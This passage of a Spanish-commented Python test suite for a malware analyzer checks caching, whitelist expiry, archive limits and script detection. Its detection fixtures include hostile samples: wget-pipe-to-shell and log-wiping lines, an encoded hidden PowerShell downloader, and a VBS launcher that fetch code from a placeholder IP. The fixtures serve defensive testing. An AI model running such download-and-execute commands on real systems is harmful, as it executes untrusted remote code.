    assert gui_stub.calls and gui_stub.calls[0][0] == '/tmp/whatever.js', \
        "La GUI debe delegar en AnalysisEngine.analyze_file"

    tmp = tempfile.mkdtemp()
    try:
        sample = os.path.join(tmp, 's.js')
        with open(sample, 'w', encoding='utf-8') as f:
            f.write('x=1\n')
        cli_obj = object.__new__(cli_mod.PyThreatAnalyzerCLI)
        cli_obj.config = {'use_cache': False}
        cli_obj.force_rescan = False
        cli_obj.cache = None
        cli_obj.analyzer = StaticAnalyzer(
            hash_db_path=os.path.join(tmp, 'm.txt'),
            whitelist_db_path=os.path.join(tmp, 'g.txt'))
        cli_stub = _StubEngine(payload)
        cli_obj.engine = cli_stub
        report = cli_obj.scan_file(sample)
        assert cli_stub.calls, "La CLI debe delegar en AnalysisEngine.analyze_file"
        assert cli_stub.calls[0][1] is not None, \
            "La CLI debe pasar los hashes ya calculados al motor (una sola lectura)"
        assert report['_cache_schema'] == cli_mod.CLI_CACHE_SCHEMA
        assert report['risk_score'] == 25 and report['risk_level'] == 'MEDIO'
        assert report['layer_scores'] == {'static': {'score': 25}}
        assert report['real_type'] == 'JAVASCRIPT'
        assert report['is_whitelisted'] is True
        assert report['whitelist_reason'] == 'lista blanca'
        print("✅ §N-17b. CLI y GUI delegan en el motor (mismo pipeline, "
              "reporte compacto CLI preservado)")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_verification_35_force_rescan_expires_whitelist():
    section("VERIF §N-17 fix1: force-rescan GUI expira la whitelist vencida")
    import threading
    import types
    import time
    _require_tkinter()
    import main as gui_mod
    from analysis_cache import AnalysisCache
    from virus_analyzer import StaticAnalyzer

    tmp = tempfile.mkdtemp()
    try:
        wl = os.path.join(tmp, 'known_good_hashes.txt')
        f_path = os.path.join(tmp, 'sample.bin')
        with open(f_path, 'wb') as f:
            f.write(b'payload bytes')
        probe = StaticAnalyzer(hash_db_path=os.path.join(tmp, 'm.txt'),
                               whitelist_db_path=os.path.join(tmp, 'g.txt'))
        h = probe.get_file_hashes(f_path)['sha256']
        with open(wl, 'w', encoding='utf-8') as f:
            f.write(h + '\n')
        analyzer = StaticAnalyzer(hash_db_path=os.path.join(tmp, 'm.txt'),
                                  whitelist_db_path=wl)
        assert h in analyzer.known_good_hashes
        cache = AnalysisCache(os.path.join(tmp, 'c.db'),
                              ttl_days=30, trust_decay_days=90)
        cache.set_whitelist_with_expiry(h, expiry_days=0)
        time.sleep(1.1)
        assert cache.is_whitelist_expired(h) is True

        class _StubEngine:
            def analyze_file(self, file_path, hashes=None):
                return {'file': file_path, 'risk_level': 'BAJO',
                        'risk_score': 5, 'indicators': [], 'hashes': hashes}

        gui = object.__new__(gui_mod.PyThreatAnalyzerGUI)
        gui.cache = cache
        gui.static_analyzer = analyzer
        gui.engine = _StubEngine()
        gui.force_rescan_var = types.SimpleNamespace(get=lambda: True)
        gui._whitelist_lock = threading.RLock()

        result, from_cache = gui._analyze_virus_cached(f_path)
        assert from_cache is False
        assert h not in analyzer.known_good_hashes, \
            "force-rescan debe retirar el hash vencido de known_good_hashes"
        with open(wl, 'r', encoding='utf-8') as f:
            assert h not in f.read(), \
                "force-rescan debe retirar el hash vencido de known_good_hashes.txt"
        print("✅ §N-17 fix1. force-rescan retira la whitelist vencida")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_verification_38_expired_whitelist_invalidates_cached_hit():
    section("VERIF §N-17 residual: whitelist vencida invalida el hit cacheado (sin force_rescan)")
    import threading
    import types
    import time
    _require_tkinter()
    import main as gui_mod
    from analysis_cache import AnalysisCache

    tmp = tempfile.mkdtemp()
    try:
        wl = os.path.join(tmp, 'known_good_hashes.txt')
        f_path = os.path.join(tmp, 'sample.bin')
        with open(f_path, 'wb') as f:
            f.write(b'payload bytes')
        from virus_analyzer import StaticAnalyzer
        probe = StaticAnalyzer(hash_db_path=os.path.join(tmp, 'm.txt'),
                               whitelist_db_path=os.path.join(tmp, 'g.txt'))
        h = probe.get_file_hashes(f_path)['sha256']
        with open(wl, 'w', encoding='utf-8') as f:
            f.write(h + '\n')
        analyzer = StaticAnalyzer(hash_db_path=os.path.join(tmp, 'm.txt'),
                                  whitelist_db_path=wl)
        cache = AnalysisCache(os.path.join(tmp, 'c.db'),
                              ttl_days=30, trust_decay_days=90)
        stale = {'file': 'old', 'risk_level': 'BAJO', 'risk_score': 0,
                 'indicators': [], '_cache_schema': gui_mod.GUI_CACHE_SCHEMA,
                 'marker': 'STALE'}
        cache.set(h, 'old', 'BAJO', stale)
        cache.set_whitelist_with_expiry(h, expiry_days=0)
        time.sleep(1.1)

        calls = []

        class _StubEngine:
            def analyze_file(self, file_path, hashes=None):
                calls.append(file_path)
                return {'file': file_path, 'risk_level': 'BAJO',
                        'risk_score': 5, 'indicators': [], 'marker': 'FRESH'}

        gui = object.__new__(gui_mod.PyThreatAnalyzerGUI)
        gui.cache = cache
        gui.static_analyzer = analyzer
        gui.engine = _StubEngine()
        gui.force_rescan_var = types.SimpleNamespace(get=lambda: False)
        gui._whitelist_lock = threading.RLock()

        result, from_cache = gui._analyze_virus_cached(f_path)
        assert from_cache is False, "el hit cacheado debe descartarse al vencer la whitelist"
        assert calls == [f_path], "debe re-analizar con el motor"
        assert result.get('marker') == 'FRESH', result
        assert h not in analyzer.known_good_hashes
        entry = cache.get(h)
        assert entry and entry['report'].get('marker') == 'FRESH', \
            "la entrada STALE debe haber sido reemplazada, no servida"
        print("✅ §N-17 residual. whitelist vencida invalida el hit cacheado")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_verification_36_engine_version_bump():
    section("VERIF §N-17 fix2: reportes con motor anterior se rechazan")
    import json
    import sqlite3
    from datetime import datetime
    from analysis_cache import AnalysisCache, ENGINE_VERSION

    assert ENGINE_VERSION == 6, \
        f"ENGINE_VERSION debe ser 6 (es {ENGINE_VERSION})"
    tmp = tempfile.mkdtemp()
    try:
        db = os.path.join(tmp, 'c.db')
        cache = AnalysisCache(db)
        conn = sqlite3.connect(db)
        conn.execute(
            "INSERT OR REPLACE INTO analysis_results "
            "(file_hash, file_path, analysis_date, engine_version, risk_level, report_json) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            ('a' * 64, 'x', datetime.now().isoformat(), ENGINE_VERSION - 1,
             'BAJO', json.dumps({'_cache_schema': 'gui-report-v1'})))
        conn.commit()
        conn.close()
        assert cache.get('a' * 64) is None, \
            "La caché no debe servir un reporte de una versión anterior del motor"
        print(f"✅ §N-17 fix2. ENGINE_VERSION={ENGINE_VERSION} invalida reportes viejos")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_verification_37_engine_exposes_tlsh():
    section("VERIF §N-17 fix3: el motor expone virus_results['tlsh']")
    from analysis_engine import AnalysisEngine
    from virus_analyzer import StaticAnalyzer
    from yara_engine import YARAEngine
    from document_analyzer import DocumentAnalyzer
    from dynamic_analyzer import DynamicAnalyzer
    from ml_detector import MLDetector
    from script_analyzer import ScriptAnalyzer
    from ai_detector import AIDetector

    tmp = tempfile.mkdtemp()
    try:
        analyzer = StaticAnalyzer(hash_db_path=os.path.join(tmp, 'm.txt'),
                                  whitelist_db_path=os.path.join(tmp, 'g.txt'))
        engine = AnalysisEngine(
            analyzer, YARAEngine(os.path.join(tmp, 'rules')),
            DocumentAnalyzer(), DynamicAnalyzer(), MLDetector(None),
            ScriptAnalyzer(), AIDetector())
        sample = os.path.join(tmp, 'sample.bin')
        with open(sample, 'wb') as f:
            f.write(b'\x7fELF' + b'\x00' * 64)
        r = engine.analyze_file(sample)
        assert 'tlsh' in r, "El motor debe exponer 'tlsh' (antes se perdía)"
        assert r['tlsh'] == (r.get('reputation') or {}).get('tlsh'), \
            "virus_results['tlsh'] debe reflejar reputation['tlsh']"
        print("✅ §N-17 fix3. virus_results['tlsh'] presente y coherente")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_r01_dropper_patterns_high_confidence():
    section("R-01: descarga+ejecución puntúa aunque ELF/script sean de baja confianza")
    from dynamic_analyzer import DynamicAnalyzer
    from risk_scoring import calculate_risk_score

    base = {'reputation': {'sha256_match': False, 'md5_match': False},
            'whitelist': {'is_whitelisted': False}}
    with tempfile.TemporaryDirectory() as tmp:
        elf = os.path.join(tmp, 'bot')
        hdr = b'\x7fELF\x02\x01\x01' + b'\x00' * 9
        lines = [b'wget http://203.0.113.5/bins.sh -O- | sh', b'cd /tmp; chmod 777 x; ./x',
                 b'/etc/rc.local', b'crontab -l', b'rm -rf /var/log/*', b'/bin/busybox ECCHI']
        with open(elf, 'wb') as f:
            f.write(hdr + b'\x00' * 200 + b'\x00'.join(lines))
        beh = DynamicAnalyzer().analyze(elf, 'ELF')
        ids = {d['id'] for d in beh['dropper_indicators']}
        assert {'DOWNLOAD_PIPE_SHELL', 'DOWNLOAD_CHMOD_EXEC'} <= ids, ids
        score, level, ind = calculate_risk_score({**base, 'behavior_analysis': beh})
        assert score >= 25 and level in ('MEDIO', 'ALTO', 'CRÍTICO'), (score, level)
        assert any(i.startswith('BEHAVIOR_DROPPER_PATTERN') for i in ind), ind

        # Un solo patrón débil (borrado de logs) NO activa el hallazgo.
        weak = os.path.join(tmp, 'rotate.sh')
        with open(weak, 'w') as f:
            f.write('#!/bin/sh\nrm -rf /var/log/old\n/bin/busybox ls\n')
        assert DynamicAnalyzer().analyze(weak, 'SHELL_SCRIPT')['dropper_indicators'] == []

        # Documentación (texto de datos) con 'curl ... | sh' NO puntúa.
        md = os.path.join(tmp, 'README.md')
        with open(md, 'w') as f:
            f.write('Instalar:\n\ncurl -fsSL https://example.com/i.sh | sh\n')
        assert DynamicAnalyzer().analyze(md, 'TEXT')['dropper_indicators'] == []
    print("✅ R-01: ELF/sh con dropper puntúan; patrón débil y documentación no")


def test_r02_nested_structured_depth_and_budget_shared():
    section("R-02: JAR/OOXML anidados respetan max_depth (contexto compartido)")
    import io
    import zipfile
    from archive_analyzer import analyze_structured_zip, ArchiveLimits

    def jar(inner):
        b = io.BytesIO()
        with zipfile.ZipFile(b, 'w') as z:
            z.writestr('META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n')
            z.writestr('in.jar', inner)
        return b.getvalue()

    limits = ArchiveLimits(max_depth=3)

    def member_analyzer(path):
        # Imita al motor: cada miembro estructurado crea un analizador NUEVO.
        res = analyze_structured_zip(path, limits=limits, member_analyzer=member_analyzer)
        return {'risk_level': res.get('risk_level', 'BENIGNO')}

    with tempfile.TemporaryDirectory() as tmp:
        data = b'MZ' + os.urandom(64)
        for _ in range(12):
            data = jar(data)
        path = os.path.join(tmp, 'nest.jar')
        with open(path, 'wb') as f:
            f.write(data)
        res = analyze_structured_zip(path, limits=limits, member_analyzer=member_analyzer)
        assert res['risk_level'] == 'ALTO', res['risk_level']
    print("✅ R-02: anidamiento de 12 JAR con max_depth=3 -> ALTO (antes sin límite)")


def test_r03_ratio_is_weak_signal_but_hard_limits_stay_critical():
    section("R-03: ratio alto no es CRÍTICO; límite duro de tamaño sí")
    import zipfile
    from archive_analyzer import analyze_structured_zip, analyze_compressed_file, ArchiveLimits

    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'rep.xlsx')
        with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('[Content_Types].xml', '<Types/>')
            z.writestr('xl/workbook.xml', '<w/>')
            z.writestr('xl/worksheets/sheet1.xml', '<r/>' * 2_000_000)
        res = analyze_structured_zip(path)
        assert res['compression_ratio'] > 100, res['compression_ratio']
        assert res['risk_level'] == 'MEDIO', res['risk_level']

        plain = os.path.join(tmp, 'zeros.zip')
        with zipfile.ZipFile(plain, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('z.bin', b'\x00' * (3 * 1024 * 1024))
        bomb = analyze_compressed_file(plain, limits=ArchiveLimits(max_total_size=1024 * 1024))
        assert bomb['risk_level'] == 'CRÍTICO', bomb['risk_level']
    print("✅ R-03: ratio>100 -> MEDIO; límite duro excedido -> CRÍTICO")


def test_r04_powershell_markers_word_boundaries():
    section("R-04: PowerShell benigno no dispara; descargador ofuscado sí")
    from script_analyzer import ScriptAnalyzer
    from risk_scoring import calculate_risk_score

    base = {'reputation': {'sha256_match': False, 'md5_match': False},
            'whitelist': {'is_whitelisted': False}}
    benign = ('$i = Get-Service | Where-Object { $_.Status -eq "Running" }\n'
              '$i | Export-Csv -Path C:\\t\\s.csv -Encoding UTF8\n'
              'Invoke-WebRequest -Uri https://example.com/api/status -UseBasicParsing\n')
    evil = ('powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n'
            'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a")\n')
    vbs = ('Set o = CreateObject("WScript.Shell")\n'
           'o.Run "cmd /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://203.0.113.5/a\')"\n')
    with tempfile.TemporaryDirectory() as tmp:
        def analyze(name, text):
            p = os.path.join(tmp, name)
            with open(p, 'w', encoding='utf-8') as f:
                f.write(text)
            return ScriptAnalyzer().analyze_script(p)

        ps_ok = analyze('ok.ps1', benign).get('powershell_analysis') or {}
        assert not ps_ok.get('suspicious'), ps_ok
        ps_bad = analyze('bad.ps1', evil).get('powershell_analysis') or {}
        assert len(ps_bad.get('suspicious', [])) >= 3, ps_bad
        res_vbs = analyze('d.vbs', vbs)
        web = (res_vbs.get('web_script_analysis') or {}).get('suspicious', [])
        assert any('PowerShell' in m for m in web), web
        score, level, ind = calculate_risk_score(base, res_vbs)
        assert 'WEB_SCRIPT_SUSPICIOUS' in ind and score >= 10, (score, ind)
    print("✅ R-04: -Encoding/Invoke-WebRequest benignos limpios; IEX/-enc/WSH detectados")


def test_r05_member_time_budget_marks_incomplete():
    section("R-05: presupuesto de tiempo de miembros -> ANALISIS_MIEMBRO_INCOMPLETO")
    import time
    import zipfile
    from archive_analyzer import analyze_compressed_file, ArchiveLimits
    from analysis_utils import collect_analysis_warnings

    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'many.zip')
        with zipfile.ZipFile(path, 'w') as z:
            for i in range(60):
                z.writestr(f'f{i}.txt', f'x{i}')

        def slow(_p):
            time.sleep(0.02)
            return {'risk_level': 'BENIGNO'}

        res = analyze_compressed_file(
            path, member_analyzer=slow, limits=ArchiveLimits(max_member_analysis_seconds=0.3))
        pats = [p for p in res['suspicious_patterns'] if p.startswith('ANALISIS_MIEMBRO_INCOMPLETO')]
        assert pats, res['suspicious_patterns']
        assert res['risk_level'] == 'SOSPECHOSO', res['risk_level']
        warnings = collect_analysis_warnings(archive_results=res)
        assert any('presupuesto' in w for w in warnings), warnings
    print("✅ R-05: presupuesto agotado -> SOSPECHOSO + warning de cobertura")


def test_r06_ast_failure_is_reported_as_incomplete():
    section("R-06: fallo del AST (no SyntaxError) -> aviso de análisis incompleto")
    from script_analyzer import ScriptAnalyzer
    from analysis_utils import collect_analysis_warnings

    with tempfile.TemporaryDirectory() as tmp:
        deep = os.path.join(tmp, 'deep.py')
        with open(deep, 'w') as f:
            f.write('x = 1\n')
        # BUG-04: el parser PEG de 3.11/3.12 puede no lanzar RecursionError con
        # una expresión larga; se simula el fallo de forma determinista.
        from unittest import mock
        with mock.patch('ast.parse', side_effect=RecursionError):
            res = ScriptAnalyzer().analyze_script(deep)
        assert (res.get('ast_analysis') or {}).get('incomplete'), res.get('ast_analysis')
        assert any('AST' in w for w in collect_analysis_warnings(script_results=res))

        py2 = os.path.join(tmp, 'py2.py')
        with open(py2, 'w') as f:
            f.write('print "hola"\n')
        res2 = ScriptAnalyzer().analyze_script(py2)
        assert not collect_analysis_warnings(script_results=res2), "SyntaxError no es incompleto"
    print("✅ R-06: RecursionError avisa; SyntaxError (no es Python) no")


def test_r09_whitelist_rewrite_preserves_permissions():
    section("R-09: la reescritura de la whitelist conserva el modo del archivo")
    if os.name == 'nt':
        print("⏭️  Omitida en Windows")
        return
    import stat
    import types
    from analysis_cache import AnalysisCache, expire_whitelist_hash_if_needed

    with tempfile.TemporaryDirectory() as tmp:
        wl = os.path.join(tmp, 'known_good_hashes.txt')
        h = 'a' * 64
        with open(wl, 'w') as f:
            f.write(h + '\n' + 'b' * 64 + '\n')
        os.chmod(wl, 0o640)
        cache = AnalysisCache(os.path.join(tmp, 'c.db'), trust_decay_days=0)
        cache.set_whitelist_with_expiry(h)
        analyzer = types.SimpleNamespace(known_good_hashes={h, 'b' * 64}, whitelist_db_path=wl)
        assert expire_whitelist_hash_if_needed(cache, analyzer, h) is True
        assert stat.S_IMODE(os.stat(wl).st_mode) == 0o640, oct(os.stat(wl).st_mode)
        assert h not in open(wl).read() and ('b' * 64) in open(wl).read()
    print("✅ R-09: modo 0640 conservado y hash retirado")


def test_r10_cli_export_csv_and_fail_on():
    section("R-10: CSV siempre escrito, columnas de estado y --fail-on")
    import csv as _csv
    import cli as cli_mod

    obj = cli_mod.PyThreatAnalyzerCLI.__new__(cli_mod.PyThreatAnalyzerCLI)
    with tempfile.TemporaryDirectory() as tmp:
        out = os.path.join(tmp, 'o.csv')
        assert obj.export_csv([], out) is True and os.path.exists(out)
        with open(out, newline='', encoding='utf-8') as f:
            header = next(_csv.reader(f))
        assert 'analysis_status' in header and 'error' in header, header
        obj.export_csv([{'error': 'boom'}], out)
        with open(out, newline='', encoding='utf-8') as f:
            row = next(_csv.DictReader(f))
        assert row['analysis_status'] == 'ERROR' and row['error'] == 'boom', row
    assert cli_mod._reaches_level([{'risk_level': 'ALTO'}], 'ALTO')
    assert not cli_mod._reaches_level([{'risk_level': 'MEDIO'}, {'risk_level': 'UNKNOWN'}], 'ALTO')
    assert cli_mod.__version__ == '3.0.0'
    print("✅ R-10: CSV vacío con cabecera, ERROR visible, --fail-on y versión única")


def test_pdf_openaction_contextual_and_zip_polyglot_scoped():
    section("FP: /OpenAction aislado y ZIP válido con .py almacenado ya no puntúan")
    import zipfile
    from document_analyzer import DocumentAnalyzer
    from virus_analyzer import StaticAnalyzer

    with tempfile.TemporaryDirectory() as tmp:
        ok = os.path.join(tmp, 'ok.pdf')
        with open(ok, 'wb') as f:
            f.write(b"%PDF-1.5\n1 0 obj\n<< /Type /Catalog /OpenAction [3 0 R /Fit] >>\nendobj\n%%EOF\n")
        res = DocumentAnalyzer()._analyze_pdf(ok)
        assert not res['suspicious'], res
        assert any(m['marker'] == '/OpenAction' for m in res['markers_found'])

        evil = os.path.join(tmp, 'evil.pdf')
        with open(evil, 'wb') as f:
            f.write(b"%PDF-1.5\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n%%EOF\n")
        assert DocumentAnalyzer()._analyze_pdf(evil)['suspicious']

        # '/AA' dentro de una etiqueta de fuente no es una acción automática.
        font = os.path.join(tmp, 'font.pdf')
        with open(font, 'wb') as f:
            f.write(b"%PDF-1.5\n<< /BaseFont /AAAAAA+Arial /Subtype /JSON >>\n%%EOF\n")
        assert not DocumentAnalyzer()._analyze_pdf(font)['suspicious']

        zp = os.path.join(tmp, 'src.zip')
        with zipfile.ZipFile(zp, 'w') as z:
            z.writestr('app.py', 'import os\nprint(1)\n')
        assert StaticAnalyzer().check_polyglot(zp) == []
        broken = os.path.join(tmp, 'broken.zip')
        with open(broken, 'wb') as f:
            f.write(b'PK\x03\x04' + b'\x00' * 20 + b'import os\nimport socket\n')
        assert StaticAnalyzer().check_polyglot(broken) == ["Posible polyglot ZIP+Python"]
    print("✅ PDF /OpenAction contextual; ZIP válido no polyglot; PK roto sí")


def _make_test_pe(path, cert=b'', trailing=b'', overlay_before_cert=b''):
    """PE32 mínimo (1 sección) con tabla de certificados opcional (DataDirectory[4])."""
    import struct
    sect_raw = b'\x90' * 0x200
    headers_size = 0x200
    dos = b'MZ' + b'\x00' * 58 + struct.pack('<I', 0x40)
    coff = struct.pack('<HHIIIHH', 0x14c, 1, 0, 0, 0, 224, 0x102)
    dd = [(0, 0)] * 16
    cert_off = headers_size + len(sect_raw) + len(overlay_before_cert)
    cert_padded = cert + b'\x00' * ((-len(cert)) % 8)
    if cert:
        dd[4] = (cert_off, len(cert_padded))
    opt = struct.pack('<HBBIIIIIIIIIHHHHHHIIIIHHIIIIII', 0x10b, 14, 0, 0x200, 0, 0, 0x1000, 0x1000,
                      0x2000, 0x400000, 0x1000, 0x200, 6, 0, 0, 0, 6, 0, 0, 0x2000, 0x200, 0, 3, 0,
                      0x100000, 0x1000, 0x100000, 0x1000, 0, 16)
    opt += b''.join(struct.pack('<II', a, b) for a, b in dd)
    sect = struct.pack('<8sIIIIIIHHI', b'.text', 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)
    hdr = dos + b'PE\0\0' + coff + opt + sect
    hdr += b'\x00' * (headers_size - len(hdr))
    with open(path, 'wb') as f:
        f.write(hdr + sect_raw + overlay_before_cert + cert_padded + trailing)
    return path


def test_n13_overlay_excludes_certificate_table_and_n09_whitelist_policy():
    section("N-13/N-09: overlay sin certificados; datos tras la firma; tope de whitelist por método")
    import virus_analyzer as va
    from risk_scoring import calculate_risk_score

    adv = va.get_advanced_features(va.StaticAnalyzer())
    cert = os.urandom(6000)
    with tempfile.TemporaryDirectory() as tmp:
        signed = _make_test_pe(os.path.join(tmp, 's.exe'), cert=cert)
        assert adv.detect_overlay(signed) is None, "la firma no es overlay"
        appended = _make_test_pe(os.path.join(tmp, 'a.exe'), cert=cert,
                                 trailing=b'MZ' + os.urandom(3000))
        ov = adv.detect_overlay(appended)
        assert ov and ov['appended_after_signature'] == 3002 and ov['is_suspicious'], ov
        assert ov['size'] == 3002 and ov['certificate_size'] == 6000, ov
        before = _make_test_pe(os.path.join(tmp, 'b.exe'), cert=cert,
                               overlay_before_cert=os.urandom(4000))
        ov2 = adv.detect_overlay(before)
        assert ov2 and ov2['size'] == 4000 and ov2['appended_after_signature'] == 0, ov2

    base = {'reputation': {'sha256_match': False, 'md5_match': False},
            'whitelist': {'is_whitelisted': True, 'method': 'authenticode'}}
    # (a) firma válida + datos anexados: se pierde el amortiguador
    score, level, ind = calculate_risk_score({**base, 'overlay': ov})
    assert 'PE_DATA_AFTER_SIGNATURE' in ind and not any(i.startswith('WHITELISTED') for i in ind), ind
    assert score >= 25, score
    # (c) authenticode + YARA alto: sin amortiguador; package_manager sí lo conserva
    yara = {'matches': [{'rule': 'r', 'meta': {'severity': 'high'}}]}
    s_auth, _, i_auth = calculate_risk_score({**base, 'yara': yara})
    assert s_auth == 40 and any(i.startswith('WHITELIST_NO_APLICADA') for i in i_auth), (s_auth, i_auth)
    pm = {**base, 'whitelist': {'is_whitelisted': True, 'method': 'package_manager'}, 'yara': yara}
    s_pm, _, i_pm = calculate_risk_score(pm)
    assert s_pm == 15 and 'WHITELISTED(package_manager)' in i_pm, (s_pm, i_pm)
    print("✅ N-13/N-09: firma no es overlay; datos tras firma puntúan; tope por método")


def test_n09d_summary_level_follows_risk_score():
    section("N-09(d): el nivel del resumen es el del scoring, no el de las explicaciones")
    from explanation_engine import ExplanationEngine

    eng = ExplanationEngine()
    eng.add_overlay_explanation(size=5000, entropy=7.9, offset=1024)
    eng.add_entropy_explanation(entropy=7.95, section='x')
    summary = eng.generate_summary(risk_level='BAJO', risk_indicators=['WHITELISTED(package_manager)'])
    assert summary['risk_level'] == 'BAJO', summary['risk_level']
    assert summary['signals_level'] in ('ALTO', 'CRÍTICO'), summary['signals_level']
    assert eng.generate_summary()['risk_level'] == summary['signals_level']
    print("✅ N-09(d): resumen BAJO con señales ALTO/CRÍTICO conservadas aparte")


def test_debt_macho_magic_type_aware_entropy_fuzzy_order_and_yara_dest():
    section("Deuda: Mach-O 32/fat, exención por magic, orden fuzzy, destino YARA")
    from file_type_detector import FileTypeDetector, RealFileType
    from analysis_utils import is_high_entropy_expected, collect_analysis_warnings
    import virus_analyzer as va
    import update_yara_rules as upd

    with tempfile.TemporaryDirectory() as tmp:
        def write(name, data):
            p = os.path.join(tmp, name)
            with open(p, 'wb') as f:
                f.write(data)
            return p

        assert FileTypeDetector.detect(write('m32', b'\xce\xfa\xed\xfe' + b'\x00' * 60)) == RealFileType.MACH_O
        fat = b'\xca\xfe\xba\xbe' + (2).to_bytes(4, 'big') + b'\x00' * 60
        assert FileTypeDetector.detect(write('fat', fat)) == RealFileType.MACH_O
        java = b'\xca\xfe\xba\xbe' + (52).to_bytes(4, 'big') + b'\x00' * 60
        assert FileTypeDetector.detect(write('J.class', java)) != RealFileType.MACH_O

        # N-11 residual: un PE renombrado a .zip/.jpg NO obtiene la exención de entropía
        assert is_high_entropy_expected(write('real.zip', b'PK\x03\x04' + b'\x00' * 30)) is True
        assert is_high_entropy_expected(write('fake.zip', b'MZ' + b'\x90' * 30)) is False
        assert is_high_entropy_expected(write('fake.jpg', b'\x7fELF' + b'\x00' * 30)) is False
        assert is_high_entropy_expected(write('real.jpg', b'\xff\xd8\xff' + b'\x00' * 30)) is True

    # N-15 residual: orden determinista + aviso de truncado
    an = va.StaticAnalyzer()
    an.known_bad_tlsh = {'T' + str(i) for i in (5, 1, 9, 3)}
    assert an._ordered_refs('known_bad_tlsh') == tuple(sorted(an.known_bad_tlsh))
    w = collect_analysis_warnings(reputation={'fuzzy_scan_limited': {'limit': 2000, 'tlsh_refs': 5000, 'ssdeep_refs': 0}})
    assert any('Coincidencia difusa limitada' in x for x in w), w

    # N-18 residual: destino de las reglas = el que lee YARAEngine
    with tempfile.TemporaryDirectory() as tmp:
        with open(os.path.join(tmp, 'config.json'), 'w') as f:
            f.write('{"yara_rules_path": "mis_reglas/"}')
        assert upd.resolve_dest_dir(None, cwd=tmp) == os.path.abspath(os.path.join(tmp, 'mis_reglas', 'community'))
        assert upd.resolve_dest_dir('/x/y') == os.path.abspath('/x/y')
        assert upd.resolve_dest_dir(None, cwd=os.path.join(tmp, 'nada')) == upd.DEST_DIR
    print("✅ Deuda: Mach-O, exención por magic, orden fuzzy determinista, destino YARA")


# ======================================================================
# Auditoría: M1-M5 / B1-B7 / K1-K9 (los ítems que dependen de
# virus_analyzer.py / verificar_y_empaquetar.py se documentan aparte).
# ======================================================================

def test_r05_engine_passes_archive_limits_to_nested():
    section("M1 (R-05): AnalysisEngine pasa ArchiveLimits y config_loader valida la clave")
    import zipfile
    from analysis_engine import AnalysisEngine
    from archive_analyzer import ArchiveLimits
    from virus_analyzer import StaticAnalyzer
    from yara_engine import YARAEngine
    from document_analyzer import DocumentAnalyzer
    from dynamic_analyzer import DynamicAnalyzer
    from ml_detector import MLDetector
    from script_analyzer import ScriptAnalyzer
    from ai_detector import AIDetector
    import config_loader

    class _SlowDynamic(DynamicAnalyzer):
        """Hace que cada miembro cueste >= 20 ms de forma determinista."""
        def analyze(self, file_path, file_type=None):
            import time
            time.sleep(0.02)
            return super().analyze(file_path, file_type)

    tmp = tempfile.mkdtemp()
    try:
        path = os.path.join(tmp, 'many.zip')
        with zipfile.ZipFile(path, 'w') as z:
            for i in range(40):
                z.writestr(f'f{i}.txt', f'contenido {i}\n')

        def make_engine(limits):
            analyzer = StaticAnalyzer(
                hash_db_path=os.path.join(tmp, 'm.txt'),
                whitelist_db_path=os.path.join(tmp, 'g.txt'))
            return AnalysisEngine(
                analyzer, YARAEngine(os.path.join(tmp, 'rules')),
                DocumentAnalyzer(), _SlowDynamic(), MLDetector(None),
                ScriptAnalyzer(), AIDetector(), archive_limits=limits)

        # (a) objeto ArchiveLimits con presupuesto diminuto -> INCOMPLETO
        res = make_engine(ArchiveLimits(max_member_analysis_seconds=0.1)).analyze_file(path)
        patterns = res['archive_analysis']['suspicious_patterns']
        assert any(p.startswith('ANALISIS_MIEMBRO_INCOMPLETO') for p in patterns), patterns
        assert any('presupuesto' in w for w in res['analysis_warnings']), res['analysis_warnings']
        assert res['analysis_status'] == 'INCOMPLETE'

        # (b) dict (config validada) tiene el mismo efecto
        res = make_engine({'max_member_analysis_seconds': 0.1}).analyze_file(path)
        assert any(p.startswith('ANALISIS_MIEMBRO_INCOMPLETO')
                   for p in res['archive_analysis']['suspicious_patterns'])

        # (c) None -> defaults (120 s): el mismo ZIP se analiza completo
        engine = make_engine(None)
        assert engine._archive_limits.max_member_analysis_seconds == 120.0
        res = engine.analyze_file(path)
        assert not any(p.startswith('ANALISIS_MIEMBRO_INCOMPLETO')
                       for p in res['archive_analysis']['suspicious_patterns'])

        # (d) config_loader: default 120.0, rango [1, 3600], tipos
        assert config_loader.DEFAULT_CONFIG['max_member_analysis_seconds'] == 120.0
        cfg_path = os.path.join(tmp, 'config.json')
        import json
        for raw, expected in ((60, 60.0), ("30", 30.0), (0, 120.0),
                              (5000, 120.0), ("treinta", 120.0), (True, 120.0)):
            with open(cfg_path, 'w', encoding='utf-8') as f:
                json.dump({'max_member_analysis_seconds': raw}, f)
            got = config_loader.load_config(cfg_path)['max_member_analysis_seconds']
            assert got == expected, (raw, got, expected)

        # (e) la CLI construye el engine con el valor de la config
        import cli as cli_mod
        with open(cfg_path, 'w', encoding='utf-8') as f:
            json.dump({'max_member_analysis_seconds': 7,
                       'cache_db_path': os.path.join(tmp, 'c.db'),
                       'use_cache': False,
                       'malware_hashes_db': os.path.join(tmp, 'm.txt'),
                       'yara_rules_path': os.path.join(tmp, 'rules')}, f)
        cli_obj = cli_mod.PyThreatAnalyzerCLI(cfg_path)
        assert cli_obj.engine._archive_limits.max_member_analysis_seconds == 7.0
        cli_obj.cache.close_all()
        print("✅ M1. max_member_analysis_seconds: config -> engine -> contenedores anidados")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_e01_on_close_cancels_and_forces_after_grace():
    section("M5 (E.1)/K2: _on_close cancela, fuerza el cierre tras la gracia, sondeo >= 50 ms")
    import logging
    import threading
    import time
    _require_tkinter()
    import main as gui_mod

